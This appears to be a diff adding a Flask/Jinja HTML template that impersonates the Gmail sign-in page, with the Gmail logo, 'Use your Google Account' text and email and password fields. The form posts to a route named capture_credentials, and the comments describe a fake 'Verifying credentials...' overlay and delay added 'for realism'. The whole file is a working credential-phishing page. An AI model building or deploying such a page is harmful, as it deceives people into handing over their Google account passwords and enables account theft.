@@ -1,0 +1,91 @@
+{% extends "base.html" %}
+
+{% block title %}Gmail - Sign In{% endblock %}
+
+{% block content %}
+<div class="login-container">
+    <div class="login-header">
+        <img src="{{ url_for('static', filename='images/gmail-logo.png') }}" alt="Gmail" class="logo">
+
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+    </div>
+    
+    <form id="loginForm" method="POST" action="{{ url_for('capture_credentials') }}" class="login-form">
+        <div class="form-group">
+            <input 
+                type="email" 
+                name="email" 
+                id="email" 
+                class="form-control" 
+                placeholder="Email or phone"
+                required
+                autocomplete="username"
+            >
+            <div class="error-message" id="emailError"></div>
+        </div>
+        
+        <div class="form-group">
+            <input 
+                type="password" 
+                name="password" 
+                id="password" 
+                class="form-control" 
+                placeholder="Enter your password"
+                required
+                autocomplete="current-password"
+            >
+            <div class="error-message" id="passwordError"></div>
+        </div>
+        
+        <div class="form-options">
+            <label class="checkbox-container">
+                <input type="checkbox" name="remember">
+                <span class="checkmark"></span>
+                Stay signed in
+            </label>
+            <a href="#" class="forgot-link">Forgot password?</a>
+        </div>
+        
+        <div class="form-actions">
+            <a href="#" class="create-account">Create account</a>
+            <button type="submit" class="btn-primary">Next</button>
+        </div>
+    </form>
+    
+    <div class="login-footer">
+        <div class="language-selector">
+            <select>
+                <option>English (United States)</option>
+                <option>Español</option>
+                <option>Français</option>
+            </select>
+        </div>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</div>
+
+<!-- Fake loading overlay for realism -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <p>Verifying credentials...</p>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    // Show loading overlay for realism
+    document.getElementById('loadingOverlay').style.display = 'flex';
+    
+    // Add slight delay to simulate real authentication
+    setTimeout(() => {
+        // Form will submit normally after delay
+    }, 1500);
+});
+</script>
+{% endblock %}
